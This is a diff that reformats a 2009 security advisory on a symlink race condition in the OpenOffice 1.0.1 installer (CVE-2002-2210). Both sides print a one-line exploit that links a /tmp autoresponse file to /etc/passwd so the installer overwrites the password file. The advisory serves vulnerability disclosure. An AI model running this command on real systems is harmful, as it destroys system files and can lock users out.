@@ -1,40 +1,46 @@
-                                Advisory #: 83
-Title: OpenOffice 1.0.1 Race condition during installation
-Author:Larry W. Cashdollar, @_larry0
-Date: 2009-09-02
-Download Site: http://www.openoffice.org/dev_docs/source/1.0.1/index.html
-Vendor:Open Office
-Vendor Notified: 2009-09-02
-Vendor Contact: bugtraq
-Description: The open office desktop suite.
-Vulnerability:
-A very simple and easy to exploit race condition exist during the installation
-of OpenOffice. During this window a malicous user could create a symlink in /
-tmp and overwrite arbitrary files.
-CVE-2002-2210
-JSON:Export
-Exploit Code:
-   1. As a normal user:
-   2.  
-   3. lwc $ ln -s /etc/passwd /tmp/$USERNAME_autoresponse.conf
-   4.  
-   5. will result in the password file being over written with:
-   6.  
-   7. # create the proper autoresponse file
-   8. <file>
-   9. cat << EOF > /tmp/${USER}autoresponse.conf [ENVIRONMENT]
-  10. INSTALLATIONMODE=$installtype
-  11. INSTALLATIONTYPE=STANDARD
-  12. DESTINATIONPATH=$prefix/$oohome
-  13. OUTERPATH=
-  14. LOGFILE=
-  15. LANGUAGELIST=<LANGUAGE>
-  16.  
-  17. [JAVA]
-  18. JavaSupport=preinstalled_or_none
-  19.  
-  20. EOF
-  21. </file>
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/
-openoffice_race_condition_during_installation.html
+
+                               Advisory #: 83
+
+   Title: OpenOffice 1.0.1 Race condition during installation
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2009-09-02
+   Download Site:
+   http://www.openoffice.org/dev_docs/source/1.0.1/index.html
+   Vendor: Open Office
+   Vendor Notified: 2009-09-02
+   Vendor Contact: bugtraq
+   Description: The open office desktop suite.
+   Vulnerability:
+   A very simple and easy to exploit race condition exist during the
+   installation of OpenOffice. During this window a malicous user could
+   create a symlink in /tmp and overwrite arbitrary files.
+   CVE-2002-2210
+   JSON: Export
+   Exploit Code:
+
+    1. As a normal user:
+    2.
+    3. lwc $ ln -s /etc/passwd /tmp/$USERNAME_autoresponse.conf
+    4.
+    5. will result in the password file being over written with:
+    6.
+    7. # create the proper autoresponse file
+    8. <file>
+    9. cat << EOF > /tmp/${USER}autoresponse.conf [ENVIRONMENT]
+   10. INSTALLATIONMODE=$installtype
+   11. INSTALLATIONTYPE=STANDARD
+   12. DESTINATIONPATH=$prefix/$oohome
+   13. OUTERPATH=
+   14. LOGFILE=
+   15. LANGUAGELIST=<LANGUAGE>
+   16.
+   17. [JAVA]
+   18. JavaSupport=preinstalled_or_none
+   19.
+   20. EOF
+   21. </file>
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/openoffice_race_condition_during_in
+   stallation.html
